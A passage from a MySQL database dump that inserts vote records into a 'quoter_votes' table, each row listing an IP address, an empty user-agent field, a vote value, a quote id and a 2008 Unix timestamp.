  (1640,'129.174.112.5','',0,79,1228766210),
  (1641,'129.174.112.5','',0,55,1228766299),
  (1642,'94.28.234.83','',0,44,1228767990),
  (1643,'81.200.116.70','',0,72,1228768097),
  (1644,'85.21.143.159','',0,79,1228768643),
  (1645,'91.124.250.103','',0,69,1228768675),
  (1646,'91.124.250.103','',0,68,1228768683),
  (1647,'91.124.250.103','',0,66,1228768689),
  (1648,'85.238.125.69','',0,66,1228768741),
  (1649,'94.28.212.26','',0,73,1228768812),
  (1650,'85.238.125.69','',0,29,1228768963),
  (1651,'85.238.125.69','',0,12,1228769045),
  (1652,'93.125.14.122','',0,48,1228769592),
  (1653,'212.106.47.51','',0,17,1228771140),
  (1654,'67.195.37.113','',0,53,1228771493),
  (1655,'91.78.38.157','',0,22,1228772841),
  (1656,'66.249.66.47','',0,78,1228774083),
  (1657,'66.249.66.47','',0,76,1228774164),
  (1658,'66.249.66.47','',0,80,1228774233),
  (1659,'66.249.66.47','',0,71,1228774303),
  (1660,'66.249.66.47','',0,75,1228774445),
  (1661,'66.249.66.47','',0,79,1228774516),
  (1662,'66.249.66.47','',0,70,1228774798),
  (1663,'66.249.66.47','',0,73,1228775068),
  (1664,'66.249.66.47','',0,74,1228775396),
  (1665,'66.249.66.47','',0,67,1228775712),
  (1666,'66.249.66.47','',0,68,1228776687),
  (1667,'66.249.66.47','',0,69,1228777540),
  (1668,'66.249.66.47','',0,72,1228777626),
  (1669,'66.249.66.47','',0,77,1228777655),
  (1670,'213.184.232.37','',0,73,1228779742),
  (1671,'66.171.215.158','',0,80,1228780559),
  (1672,'77.88.30.246','',0,39,1228785312),
  (1673,'77.88.30.246','',0,67,1228785321),
  (1674,'77.88.30.246','',0,6,1228785330),
  (1675,'77.88.30.246','',0,25,1228785357),
  (1676,'77.88.30.246','',0,9,1228785363),
  (1677,'77.88.30.246','',0,24,1228785374),
  (1678,'77.88.30.246','',0,55,1228785380),
  (1679,'77.88.30.246','',0,65,1228785392),
  (1680,'77.88.30.246','',0,7,1228785399),
  (1681,'77.88.30.246','',0,61,1228785448),
  (1682,'77.88.30.246','',0,10,1228785457),
  (1683,'67.195.37.113','',0,61,1228785460),
  (1684,'77.88.30.246','',0,44,1228785491),
  (1685,'77.88.30.246','',0,42,1228785496),
  (1686,'77.88.30.246','',0,4,1228785509),
  (1687,'77.88.30.246','',0,66,1228785515),
  (1688,'77.88.30.246','',0,52,1228785520),
  (1689,'77.88.30.246','',0,18,1228785526),
  (1690,'77.88.30.246','',0,53,1228785540),
  (1691,'77.88.30.246','',0,54,1228785547),
  (1692,'77.88.30.246','',0,8,1228785549),
  (1693,'77.88.30.246','',0,38,1228785554),
  (1694,'77.88.30.246','',0,20,1228785569),
  (1695,'77.88.30.246','',0,2,1228785574),
  (1696,'77.88.30.246','',0,64,1228785581),
  (1697,'77.88.30.246','',0,1,1228785602),
  (1698,'77.88.30.246','',0,12,1228785610),
  (1699,'77.88.30.246','',0,28,1228785654),
  (1700,'77.88.30.246','',0,56,1228785664),
  (1701,'77.88.30.246','',0,5,1228785670),
  (1702,'77.88.30.246','',0,57,1228785675),
  (1703,'77.88.30.246','',0,26,1228785686),
  (1704,'77.88.30.246','',0,19,1228785692),
  (1705,'77.88.30.246','',0,17,1228785694),
  (1706,'77.88.30.246','',0,51,1228785697),
  (1707,'77.88.30.246','',0,13,1228785702),
  (1708,'77.88.30.246','',0,11,1228785711),
  (1709,'77.88.30.246','',0,43,1228785715),
  (1710,'77.88.30.246','',0,46,1228785752),
  (1711,'77.88.30.246','',0,63,1228785763),
  (1712,'77.88.30.246','',0,15,1228785769),
  (1713,'77.88.30.246','',0,21,1228785771),
  (1714,'77.88.30.246','',0,27,1228785794),
  (1715,'77.88.30.246','',0,47,1228785801),
  (1716,'77.88.30.246','',0,29,1228785808),
  (1717,'77.88.30.246','',0,23,1228785830),
  (1718,'77.88.30.246','',0,62,1228785836),
  (1719,'77.88.30.246','',0,16,1228785858),
  (1720,'77.88.30.246','',0,60,1228785861),
  (1721,'77.88.30.246','',0,58,1228785913),
  (1722,'77.88.30.246','',0,30,1228785918),
  (1723,'77.52.227.214','',0,81,1228789088),
  (1724,'79.111.190.70','',0,55,1228791719),
  (1725,'89.218.21.231','',0,55,1228793278),
  (1726,'77.88.30.246','',0,66,1228795369),
  (1727,'77.88.30.246','',0,63,1228795381),
  (1728,'77.88.30.246','',0,64,1228795418),
  (1729,'77.88.30.246','',0,44,1228795424),
  (1730,'77.88.30.246','',0,67,1228795446),
  (1731,'77.88.30.246','',0,58,1228795454),
  (1732,'77.88.30.246','',0,65,1228795475),
  (1733,'77.88.30.246','',0,53,1228795494),
  (1734,'77.88.30.246','',0,62,1228795512),
  (1735,'77.88.30.246','',0,61,1228795518),
  (1736,'80.243.71.189','',0,81,1228795990),
  (1737,'80.243.71.189','',0,76,1228796082),
  (1738,'80.243.71.189','',0,70,1228796279),
  (1739,'67.202.43.229','',0,61,1228796749),
  (1740,'80.237.112.245','',0,81,1228797874),
  (1741,'80.237.112.245','',0,73,1228798037),
  (1742,'80.237.112.245','',0,74,1228798038),
  (1743,'80.237.112.245','',0,67,1228798185),
  (1744,'80.243.71.189','',0,80,1228798187),
  (1745,'92.46.7.177','',0,55,1228799506),
  (1746,'92.46.13.140','',0,55,1228799527),
  (1747,'92.46.23.121','',0,55,1228799553),
  (1748,'92.46.13.250','',0,55,1228799577),
  (1749,'67.202.43.229','',0,18,1228800283),
  (1750,'67.202.43.229','',0,48,1228800289),
  (1751,'67.202.43.229','',0,20,1228800517),
  (1752,'67.202.43.229','',0,21,1228800729),
  (1753,'67.202.43.229','',0,1,1228800821),
  (1754,'67.202.43.229','',0,50,1228801508),
  (1755,'72.30.142.109','',0,77,1228802607),
  (1756,'72.30.142.109','',0,80,1228802671),
  (1757,'72.30.142.109','',0,76,1228802671),
  (1758,'72.30.142.109','',0,78,1228802673),
  (1759,'72.30.142.109','',0,73,1228802679),
  (1760,'72.30.142.109','',0,72,1228802702),
  (1761,'72.30.142.109','',0,75,1228802716),
  (1762,'72.30.142.109','',0,81,1228802921),
  (1763,'72.30.142.109','',0,79,1228803022),
  (1764,'92.47.225.247','',0,55,1228804473),
  (1765,'84.17.2.10','',0,54,1228804620),
  (1766,'84.17.2.10','',0,53,1228804632),
  (1767,'84.17.2.10','',0,52,1228804641),
  (1768,'84.17.2.10','',0,50,1228804700),
  (1769,'84.17.2.10','',0,43,1228804892),
  (1770,'84.17.2.10','',0,42,1228804899),
  (1771,'84.17.2.10','',0,39,1228804905),
  (1772,'212.176.15.250','',0,80,1228805000),
  (1773,'84.17.2.10','',0,28,1228805055),
  (1774,'84.17.2.10','',0,27,1228805085),
  (1775,'84.17.2.10','',0,19,1228805496),
  (1776,'84.17.2.10','',0,18,1228805510),
  (1777,'84.17.2.10','',0,6,1228805867),
  (1778,'84.17.2.10','',0,2,1228805944),
  (1779,'80.243.71.189','',0,72,1228805949),
  (1780,'84.17.2.10','',0,1,1228805955),
  (1781,'80.248.48.110','',0,80,1228807775),
  (1782,'80.248.48.110','',0,78,1228807792),
  (1783,'89.218.20.128','',0,55,1228807964),
  (1784,'91.190.68.145','',0,12,1228812242),
  (1785,'91.190.68.145','',0,15,1228812247),
  (1786,'91.190.68.145','',0,69,1228812281),
  (1787,'194.186.214.34','',0,42,1228812285),
  (1788,'195.250.76.194','',0,80,1228812319),
  (1789,'91.190.68.145','',0,67,1228812345),
  (1790,'195.250.76.194','',0,79,1228812353),
  (1791,'91.190.68.145','',0,74,1228812373),
  (1792,'84.42.45.45','',0,78,1228812386),
  (1793,'91.190.68.145','',0,66,1228812407),
  (1794,'91.190.68.145','',0,64,1228812471),
  (1795,'91.190.68.145','',0,55,1228812606),
  (1796,'91.190.68.145','',0,29,1228812655),
  (1797,'91.190.68.145','',0,1,1228812667),
  (1798,'91.190.68.145','',0,21,1228812741),
  (1799,'91.190.68.145','',0,39,1228812755),
  (1800,'91.190.68.145','',0,18,1228812761),
  (1801,'91.190.68.145','',0,42,1228812837),
  (1802,'91.190.68.145','',0,38,1228812875),
  (1803,'91.190.68.145','',0,10,1228812942),
  (1804,'91.190.68.145','',0,9,1228812949),
  (1805,'91.190.68.145','',0,8,1228812958),
  (1806,'91.190.68.145','',0,7,1228812970),
  (1807,'91.190.68.145','',0,6,1228812984),
  (1808,'91.190.68.145','',0,2,1228813000),
  (1809,'217.170.91.8','',0,79,1228813163),
  (1810,'217.170.91.8','',0,80,1228813175),
  (1811,'217.170.91.8','',0,81,1228813188),
  (1812,'217.12.97.5','',0,20,1228814194),
  (1813,'195.5.36.242','',0,76,1228814957),
  (1814,'195.5.36.242','',0,74,1228815105),
  (1815,'62.64.76.234','',0,19,1228816132),
  (1816,'195.19.204.168','',0,55,1228816199),
  (1817,'81.198.172.227','',0,81,1228816316),
  (1818,'195.218.242.11','',0,67,1228816554),
  (1819,'91.202.197.79','',0,83,1228817147),
  (1820,'91.202.197.79','',0,81,1228817159),
  (1821,'91.202.197.79','',0,77,1228817286),
  (1822,'91.202.197.79','',0,76,1228817290),
  (1823,'80.80.111.200','',0,71,1228817723),
  (1824,'78.24.226.23','',0,29,1228817969),
  (1825,'78.24.226.23','',0,1,1228817970),
  (1826,'78.24.226.23','',0,55,1228817972),
  (1827,'78.24.226.23','',0,21,1228817979),
  (1828,'78.24.226.23','',0,4,1228818043),
  (1829,'78.24.226.23','',0,2,1228818046),
  (1830,'78.24.226.23','',0,6,1228818049),
  (1831,'80.254.49.98','',0,54,1228818211),
  (1832,'72.30.142.109','',0,1,1228818491),
  (1833,'195.62.48.70','',0,71,1228819343),
  (1834,'84.204.148.130','',0,76,1228819722),
  (1835,'80.64.109.228','',0,28,1228820116),
  (1836,'80.64.109.228','',0,16,1228820167),
  (1837,'80.64.109.228','',0,55,1228820188),
  (1838,'80.64.109.228','',0,29,1228820235),
  (1839,'195.238.246.168','',0,82,1228820369),
  (1840,'80.64.109.228','',0,46,1228820428),
  (1841,'91.202.197.79','',0,84,1228820736),
  (1842,'80.73.0.127','',0,81,1228822391),
  (1843,'80.73.0.127','',0,80,1228822438),
  (1844,'80.73.0.127','',0,67,1228822577),
  (1845,'80.73.0.127','',0,25,1228822611),
  (1846,'212.150.121.22','',0,61,1228822641),
  (1847,'77.35.227.154','',0,78,1228822697),
  (1848,'77.35.227.154','',0,61,1228823250),
  (1849,'77.35.227.154','',0,55,1228823344),
  (1850,'195.218.242.11','',0,24,1228823570),
  (1851,'195.250.76.194','',0,84,1228823723),
  (1852,'195.250.76.194','',0,83,1228823727),
  (1853,'195.250.76.194','',0,82,1228823736),
  (1854,'212.5.80.66','',0,19,1228823823),
  (1855,'79.132.105.4','',0,81,1228823964),
  (1856,'92.47.186.217','',0,55,1228824331),
  (1857,'77.221.192.190','',0,48,1228824971),
  (1858,'79.133.175.5','',0,76,1228825256),
  (1859,'79.133.175.5','',0,73,1228825288),
  (1860,'79.133.175.5','',0,48,1228825499),
  (1861,'94.248.53.109','',0,84,1228825791),
  (1862,'92.47.186.217','',0,82,1228826072),
  (1863,'92.47.186.217','',0,80,1228826094),
  (1864,'92.47.186.217','',0,76,1228826228),
  (1865,'78.36.169.22','',0,55,1228826350),
  (1866,'95.56.2.9','',0,55,1228826354),
  (1867,'94.178.241.236','',0,84,1228827174),
  (1868,'94.178.241.236','',0,83,1228827196),
  (1869,'94.178.241.236','',0,82,1228827227),
  (1870,'91.202.197.79','',0,86,1228829577),
  (1871,'91.202.197.79','',0,85,1228829583),
  (1872,'91.202.197.79','',0,84,1228829592),
  (1873,'193.124.157.201','',0,81,1228830645),
  (1874,'78.36.244.44','',0,85,1228830738),
  (1875,'91.124.118.120','',0,61,1228830998),
  (1876,'72.30.78.245','',0,19,1228831364),
  (1877,'88.81.247.18','',0,84,1228832059),
  (1878,'88.81.247.18','',0,82,1228832097),
  (1879,'88.81.247.18','',0,79,1228832127),
  (1880,'88.81.247.18','',0,78,1228832134),
  (1881,'212.3.144.60','',0,23,1228832190),
  (1882,'81.23.112.211','',0,75,1228832702),
  (1883,'81.23.112.211','',0,76,1228832705),
  (1884,'81.23.112.211','',0,57,1228832792),
  (1885,'81.23.112.211','',0,48,1228832866),
  (1886,'213.165.180.22','',0,19,1228832968),
  (1887,'66.249.66.47','',0,43,1228833213),
  (1888,'88.81.247.18','',0,55,1228833329),
  (1889,'88.81.247.18','',0,29,1228833352),
  (1890,'88.81.247.18','',0,18,1228833373),
  (1891,'88.81.247.18','',0,50,1228833445),
  (1892,'88.81.247.18','',0,56,1228833478),
  (1893,'80.249.229.64','',0,61,1228833788),
  (1894,'84.204.148.130','',0,57,1228834063),
  (1895,'91.185.51.111','',0,85,1228834334),
  (1896,'91.202.197.79','',0,55,1228835020),
  (1897,'91.202.197.79','',0,20,1228835216),
  (1898,'91.202.197.79','',0,54,1228835417),
  (1899,'91.202.197.79','',0,66,1228835423),
  (1900,'212.176.211.125','',0,22,1228835667),
  (1901,'212.176.211.125','',0,23,1228835673),
  (1902,'212.176.211.125','',0,24,1228835696),
  (1903,'91.185.51.111','',0,84,1228835697),
  (1904,'212.176.211.125','',0,29,1228835715),
  (1905,'212.176.211.125','',0,1,1228835716),
  (1906,'212.176.211.125','',0,67,1228835752),
  (1907,'212.176.211.125','',0,2,1228835804),
  (1908,'212.176.211.125','',0,8,1228835827),
  (1909,'212.176.211.125','',0,56,1228835887),
  (1910,'91.202.197.79','',0,63,1228836387),
  (1911,'91.202.197.79','',0,39,1228836414),
  (1912,'91.202.197.79','',0,56,1228836417),
  (1913,'90.150.122.198','',0,78,1228836501),
  (1914,'91.185.51.111','',0,1,1228836592),
  (1915,'91.185.51.111','',0,2,1228836593),
  (1916,'91.185.51.111','',0,3,1228836594),
  (1917,'91.185.51.111','',0,4,1228836595),
  (1918,'91.185.51.111','',0,5,1228836596),
  (1919,'91.185.51.111','',0,6,1228836598),
  (1920,'91.185.51.111','',0,7,1228836599),
  (1921,'91.185.51.111','',0,8,1228836601),
  (1922,'91.185.51.111','',0,9,1228836602),
  (1923,'91.185.51.111','',0,10,1228836603),
  (1924,'91.185.51.111','',0,11,1228836604),
  (1925,'91.185.51.111','',0,12,1228836605),
  (1926,'91.185.51.111','',0,13,1228836607),
  (1927,'91.185.51.111','',0,14,1228836609),
  (1928,'91.185.51.111','',0,15,1228836613),
  (1929,'91.185.51.111','',0,16,1228836614),
  (1930,'91.185.51.111','',0,17,1228836616),
  (1931,'91.185.51.111','',0,18,1228836618),
  (1932,'91.185.51.111','',0,19,1228836620),
  (1933,'91.185.51.111','',0,20,1228836621),
  (1934,'91.185.51.111','',0,21,1228836624),
  (1935,'91.185.51.111','',0,22,1228836625),
  (1936,'91.185.51.111','',0,23,1228836626),
  (1937,'91.185.51.111','',0,24,1228836627),
  (1938,'91.185.51.111','',0,25,1228836628),
  (1939,'91.185.51.111','',0,26,1228836629),
  (1940,'91.185.51.111','',0,27,1228836630),
  (1941,'91.185.51.111','',0,28,1228836631),
  (1942,'91.185.51.111','',0,29,1228836632),
  (1943,'91.185.51.111','',0,30,1228836633),
  (1944,'91.185.51.111','',0,38,1228836646),
  (1945,'91.185.51.111','',0,39,1228836647),
  (1946,'91.185.51.111','',0,42,1228836655),
  (1947,'91.185.51.111','',0,43,1228836657),
  (1948,'91.185.51.111','',0,44,1228836659),
  (1949,'91.185.51.111','',0,46,1228836666),
  (1950,'91.185.51.111','',0,47,1228836669),
  (1951,'91.185.51.111','',0,48,1228836672),
  (1952,'91.185.51.111','',0,49,1228836675),
  (1953,'91.185.51.111','',0,50,1228836676),
  (1954,'91.185.51.111','',0,51,1228836679),
  (1955,'91.185.51.111','',0,52,1228836680),
  (1956,'91.185.51.111','',0,53,1228836681),
  (1957,'91.185.51.111','',0,54,1228836682),
  (1958,'91.185.51.111','',0,55,1228836683),
  (1959,'91.185.51.111','',0,56,1228836684),
  (1960,'91.185.51.111','',0,57,1228836685),
  (1961,'91.185.51.111','',0,58,1228836687),
  (1962,'91.185.51.111','',0,60,1228836691),
  (1963,'91.185.51.111','',0,61,1228836692),
  (1964,'91.185.51.111','',0,62,1228836695),
  (1965,'91.185.51.111','',0,63,1228836702),
  (1966,'91.185.51.111','',0,64,1228836706),
  (1967,'91.185.51.111','',0,65,1228836710),
  (1968,'91.185.51.111','',0,66,1228836714),
  (1969,'91.185.51.111','',0,67,1228836717),
  (1970,'91.185.51.111','',0,68,1228836719),
  (1971,'91.185.51.111','',0,69,1228836723),
  (1972,'91.185.51.111','',0,70,1228836727),
  (1973,'91.185.51.111','',0,71,1228836729),
  (1974,'91.185.51.111','',0,72,1228836732),
  (1975,'91.185.51.111','',0,73,1228836734),
  (1976,'91.185.51.111','',0,74,1228836736),
  (1977,'91.185.51.111','',0,75,1228836738),
  (1978,'91.185.51.111','',0,76,1228836742),
  (1979,'91.185.51.111','',0,77,1228836743),
  (1980,'91.185.51.111','',0,78,1228836745),
  (1981,'91.185.51.111','',0,79,1228836748),
  (1982,'91.185.51.111','',0,80,1228836751),
  (1983,'91.185.51.111','',0,81,1228836753),
  (1984,'91.185.51.111','',0,82,1228836755),
  (1985,'82.179.249.3','',0,83,1228836838),
  (1986,'213.33.238.142','',0,24,1228837117),
  (1987,'213.221.53.193','',0,56,1228837149),
  (1988,'213.221.53.193','',0,79,1228837159),
  (1989,'213.221.53.193','',0,49,1228837167),
  (1990,'213.221.53.193','',0,47,1228837175),
  (1991,'213.221.53.193','',0,43,1228837183),
  (1992,'213.221.53.193','',0,28,1228837192),
  (1993,'213.221.53.193','',0,16,1228837194),
  (1994,'213.221.53.193','',0,19,1228837200),
  (1995,'91.185.51.111','',0,83,1228837880),
  (1996,'91.185.51.111','',0,86,1228838355),
  (1997,'80.249.179.82','',0,46,1228838474),
  (1998,'66.249.66.47','',0,48,1228839756),
  (1999,'92.125.108.199','',0,63,1228840223),
  (2000,'92.125.108.199','',0,60,1228840246);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 2000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (2001,'66.249.66.47','',0,13,1228840807),
  (2002,'193.124.157.201','',0,87,1228841505),
  (2003,'193.124.157.201','',0,29,1228841543),
  (2004,'193.124.157.201','',0,21,1228841564),
  (2005,'193.124.157.201','',0,1,1228841567),
  (2006,'193.124.157.201','',0,18,1228841573),
  (2007,'195.46.35.28','',0,61,1228842171),
  (2008,'213.133.166.130','',0,29,1228842345),
  (2009,'66.249.66.47','',0,12,1228843368),
  (2010,'91.77.87.49','',0,86,1228844096),
  (2011,'91.77.87.49','',0,85,1228844111),
  (2012,'91.77.87.49','',0,83,1228844218),
  (2013,'91.77.87.49','',0,70,1228844592),
  (2014,'89.188.114.72','',0,82,1228847613),
  (2015,'89.188.114.72','',0,78,1228847764),
  (2016,'77.244.213.221','',0,85,1228849154),
  (2017,'95.31.3.189','',0,85,1228850117),
  (2018,'95.31.3.189','',0,78,1228850238),
  (2019,'95.31.3.189','',0,55,1228850369),
  (2020,'95.31.3.189','',0,1,1228850398),
  (2021,'95.31.3.189','',0,21,1228850566),
  (2022,'95.31.3.189','',0,18,1228850571),
  (2023,'66.249.66.47','',0,12,1228850719),
  (2024,'95.31.3.189','',0,56,1228850822),
  (2025,'74.6.22.121','',0,74,1228852340),
  (2026,'95.28.24.15','',0,3,1228852640),
  (2027,'77.241.33.76','',0,25,1228853188),
  (2028,'77.122.245.211','',0,87,1228853930),
  (2029,'194.88.211.254','',0,50,1228855255),
  (2030,'91.76.154.252','',0,79,1228867196),
  (2031,'91.76.154.252','',0,80,1228867202),
  (2032,'91.76.154.252','',0,81,1228867211),
  (2033,'91.76.154.252','',0,82,1228867219),
  (2034,'91.76.154.252','',0,83,1228867225),
  (2035,'91.76.154.252','',0,84,1228867236),
  (2036,'91.76.154.252','',0,85,1228867245),
  (2037,'91.76.154.252','',0,86,1228867253),
  (2038,'91.76.154.252','',0,87,1228867258),
  (2039,'91.76.154.252','',0,88,1228867264),
  (2040,'77.88.30.246','',0,80,1228867363),
  (2041,'77.88.30.246','',0,77,1228867375),
  (2042,'77.88.30.246','',0,75,1228867392),
  (2043,'77.88.30.246','',0,76,1228867410),
  (2044,'77.88.30.246','',0,78,1228867452),
  (2045,'77.88.30.246','',0,68,1228867469),
  (2046,'77.88.30.246','',0,79,1228867486),
  (2047,'77.88.30.246','',0,71,1228867491),
  (2048,'77.88.30.246','',0,70,1228867502),
  (2049,'77.88.30.246','',0,73,1228867549),
  (2050,'77.88.30.246','',0,69,1228867556),
  (2051,'72.30.79.90','',0,74,1228868119),
  (2052,'80.243.71.189','',0,85,1228869320),
  (2053,'80.243.71.189','',0,29,1228869351),
  (2054,'80.243.71.189','',0,1,1228869353),
  (2055,'80.243.71.189','',0,55,1228869358),
  (2056,'94.253.18.88','',0,55,1228872004),
  (2057,'95.28.24.15','',0,55,1228877584),
  (2058,'95.56.5.16','',0,55,1228877908),
  (2059,'95.56.8.219','',0,55,1228878251),
  (2060,'80.243.71.189','',0,81,1228880668),
  (2061,'80.243.71.189','',0,69,1228880717),
  (2062,'80.243.71.189','',0,56,1228880817),
  (2063,'80.243.71.189','',0,54,1228880819),
  (2064,'81.195.198.18','',0,76,1228888324),
  (2065,'81.195.198.18','',0,75,1228888329),
  (2066,'81.195.198.18','',0,71,1228888332),
  (2067,'92.47.236.55','',0,82,1228889872),
  (2068,'92.47.236.55','',0,76,1228889924),
  (2069,'92.47.236.55','',0,71,1228890008),
  (2070,'92.47.236.55','',0,70,1228890035),
  (2071,'92.47.236.55','',0,65,1228890206),
  (2072,'92.47.236.55','',0,63,1228890269),
  (2073,'92.47.236.55','',0,60,1228890347),
  (2074,'92.47.236.55','',0,55,1228890389),
  (2075,'77.221.192.190','',0,85,1228898576),
  (2076,'62.76.92.216','',0,89,1228900330),
  (2077,'62.76.92.216','',0,90,1228900334),
  (2078,'213.208.171.192','',0,56,1228901068),
  (2079,'78.24.227.40','',0,1,1228904355),
  (2080,'78.24.227.40','',0,55,1228904360),
  (2081,'78.24.227.40','',0,29,1228904361),
  (2082,'91.202.197.79','',0,85,1228904366),
  (2083,'91.202.197.79','',0,90,1228904381),
  (2084,'72.30.87.112','',0,84,1228904934),
  (2085,'72.30.87.112','',0,83,1228904936),
  (2086,'72.30.87.112','',0,89,1228904976),
  (2087,'72.30.87.112','',0,86,1228904991),
  (2088,'72.30.87.112','',0,87,1228905013),
  (2089,'72.30.87.112','',0,85,1228905030),
  (2090,'72.30.87.112','',0,90,1228905054),
  (2091,'72.30.87.112','',0,88,1228905065),
  (2092,'72.30.87.112','',0,82,1228905100),
  (2093,'194.186.228.46','',0,84,1228906435),
  (2094,'194.186.228.46','',0,90,1228906463),
  (2095,'84.204.148.130','',0,87,1228906933),
  (2096,'84.204.148.130','',0,76,1228906998),
  (2097,'92.47.236.55','',0,55,1228907663),
  (2098,'212.176.211.125','',0,23,1228908486),
  (2099,'85.195.131.10','',0,56,1228910825),
  (2100,'91.202.197.79','',0,91,1228910961),
  (2101,'91.202.197.79','',0,87,1228910991),
  (2102,'91.202.197.79','',0,83,1228911003),
  (2103,'91.202.197.79','',0,76,1228911030),
  (2104,'91.202.197.79','',0,71,1228911066),
  (2105,'91.202.197.79','',0,70,1228911067),
  (2106,'91.202.197.79','',0,67,1228911080),
  (2107,'62.76.92.216','',0,91,1228911918),
  (2108,'85.195.131.10','',0,61,1228912182),
  (2109,'85.195.131.10','',0,90,1228912197),
  (2110,'72.30.161.249','',0,30,1228914569),
  (2111,'84.204.148.130','',0,91,1228914686),
  (2112,'85.195.131.10','',0,92,1228914748),
  (2113,'91.202.197.79','',0,94,1228914968),
  (2114,'80.243.3.230','',0,94,1228915986),
  (2115,'91.202.197.79','',0,95,1228917089),
  (2116,'195.20.195.133','',0,91,1228918141),
  (2117,'72.30.161.249','',0,86,1228919363),
  (2118,'159.93.44.106','',0,94,1228920214),
  (2119,'159.93.44.106','',0,95,1228920216),
  (2120,'159.93.44.106','',0,93,1228920234),
  (2121,'159.93.44.106','',0,90,1228920308),
  (2122,'159.93.44.106','',0,89,1228920341),
  (2123,'159.93.44.106','',0,2,1228920581),
  (2124,'159.93.44.106','',0,24,1228920857),
  (2125,'62.5.183.82','',0,72,1228920891),
  (2126,'159.93.44.106','',0,21,1228921043),
  (2127,'159.93.44.106','',0,18,1228921611),
  (2128,'77.94.34.166','',0,56,1228921914),
  (2129,'159.93.44.106','',0,52,1228922031),
  (2130,'77.35.30.8','',0,87,1228922758),
  (2131,'77.35.30.8','',0,80,1228922890),
  (2132,'77.35.30.8','',0,74,1228924131),
  (2133,'77.35.30.8','',0,71,1228924248),
  (2134,'77.35.30.8','',0,30,1228924267),
  (2135,'89.218.25.9','',0,55,1228925374),
  (2136,'77.35.30.8','',0,94,1228925416),
  (2137,'194.88.211.254','',0,99,1228928803),
  (2138,'194.88.211.254','',0,50,1228928950),
  (2139,'66.249.66.47','',0,47,1228930454),
  (2140,'77.88.30.246','',0,88,1228934276),
  (2141,'66.249.66.47','',0,46,1228935318),
  (2142,'77.88.30.246','',0,83,1228936012),
  (2143,'77.88.30.246','',0,74,1228937090),
  (2144,'77.88.30.246','',0,80,1228937101),
  (2145,'77.88.30.246','',0,82,1228937108),
  (2146,'77.88.30.246','',0,72,1228937125),
  (2147,'77.88.30.246','',0,86,1228937131),
  (2148,'77.88.30.246','',0,85,1228937158),
  (2149,'77.88.30.246','',0,81,1228937161),
  (2150,'77.88.30.246','',0,87,1228937174),
  (2151,'77.88.30.246','',0,84,1228937180),
  (2152,'194.242.119.74','',0,56,1228938778),
  (2153,'194.242.119.74','',0,19,1228939010),
  (2154,'193.27.209.200','',0,89,1228939565),
  (2155,'79.171.124.20','',0,99,1228941301),
  (2156,'79.171.124.20','',0,97,1228942851),
  (2157,'91.187.4.198','',0,98,1228944937),
  (2158,'72.30.79.87','',0,43,1228945829),
  (2159,'72.30.79.87','',0,5,1228945865),
  (2160,'72.30.79.87','',0,44,1228945924),
  (2161,'72.30.79.87','',0,95,1228946026),
  (2162,'72.30.79.87','',0,71,1228946103),
  (2163,'72.30.79.87','',0,22,1228946430),
  (2164,'72.30.79.87','',0,23,1228946460),
  (2165,'72.30.79.87','',0,92,1228946532),
  (2166,'194.186.242.6','',0,99,1228946679),
  (2167,'72.30.79.87','',0,97,1228946863),
  (2168,'72.30.79.87','',0,24,1228946975),
  (2169,'66.249.66.47','',0,85,1228947251),
  (2170,'72.30.79.87','',0,98,1228947402),
  (2171,'72.30.79.87','',0,51,1228947481),
  (2172,'72.30.79.87','',0,42,1228947483),
  (2173,'72.30.79.87','',0,47,1228947608),
  (2174,'72.30.79.87','',0,68,1228947832),
  (2175,'66.249.66.47','',0,46,1228948714),
  (2176,'91.124.169.63','',0,69,1228948965),
  (2177,'91.124.169.63','',0,68,1228948978),
  (2178,'91.124.169.63','',0,66,1228948983),
  (2179,'72.30.79.87','',0,21,1228949339),
  (2180,'72.30.79.87','',0,99,1228951229),
  (2181,'80.237.112.245','',0,100,1228951971),
  (2182,'66.249.66.47','',0,47,1228952337),
  (2183,'80.243.71.189','',0,55,1228954632),
  (2184,'80.243.71.189','',0,1,1228954634),
  (2185,'80.243.71.189','',0,29,1228954638),
  (2186,'80.243.71.189','',0,4,1228954654),
  (2187,'80.243.71.189','',0,63,1228954656),
  (2188,'67.202.43.229','',0,79,1228954722),
  (2189,'67.202.43.229','',0,80,1228954734),
  (2190,'67.202.43.229','',0,81,1228954746),
  (2191,'67.202.43.229','',0,82,1228954755),
  (2192,'67.202.43.229','',0,83,1228954765),
  (2193,'67.202.43.229','',0,84,1228954777),
  (2194,'67.202.43.229','',0,85,1228954788),
  (2195,'67.202.43.229','',0,86,1228954799),
  (2196,'67.202.43.229','',0,87,1228954809),
  (2197,'67.202.43.229','',0,88,1228954828),
  (2198,'72.30.79.87','',0,46,1228955394),
  (2199,'72.30.79.87','',0,47,1228955406),
  (2200,'77.88.30.246','',0,74,1228957872),
  (2201,'77.88.30.246','',0,84,1228957879),
  (2202,'77.88.30.246','',0,81,1228957884),
  (2203,'77.88.30.246','',0,85,1228957913),
  (2204,'77.88.30.246','',0,86,1228957944),
  (2205,'77.88.30.246','',0,83,1228957951),
  (2206,'77.88.30.246','',0,72,1228957966),
  (2207,'77.88.30.246','',0,87,1228957975),
  (2208,'77.88.30.246','',0,88,1228958006),
  (2209,'81.18.116.69','',0,98,1228958192),
  (2210,'80.243.71.189','',0,100,1228958529),
  (2211,'80.243.71.189','',0,99,1228958537),
  (2212,'80.243.71.189','',0,98,1228958545),
  (2213,'80.243.71.189','',0,95,1228958558),
  (2214,'80.243.71.189','',0,94,1228958562),
  (2215,'72.30.79.87','',0,49,1228958877),
  (2216,'66.249.66.47','',0,52,1228960195),
  (2217,'72.30.79.87','',0,23,1228960406),
  (2218,'80.243.71.189','',0,97,1228961349),
  (2219,'80.237.112.245','',0,55,1228963485),
  (2220,'80.237.112.245','',0,1,1228963525),
  (2221,'80.237.112.245','',0,21,1228963559),
  (2222,'72.30.81.166','',0,27,1228964602),
  (2223,'66.249.66.47','',0,12,1228965265),
  (2224,'66.249.66.47','',0,46,1228965878),
  (2225,'80.243.71.189','',0,96,1228967382),
  (2226,'92.46.47.134','',0,100,1228967392),
  (2227,'92.46.47.134','',0,98,1228967450),
  (2228,'92.46.47.134','',0,91,1228967543),
  (2229,'92.46.47.134','',0,55,1228967554),
  (2230,'81.19.66.89','',0,75,1228969029),
  (2231,'81.19.66.89','',0,76,1228969031),
  (2232,'72.30.142.254','',0,27,1228969037),
  (2233,'72.30.142.254','',0,28,1228969118),
  (2234,'66.249.66.47','',0,86,1228969610),
  (2235,'81.19.66.89','',0,77,1228970923),
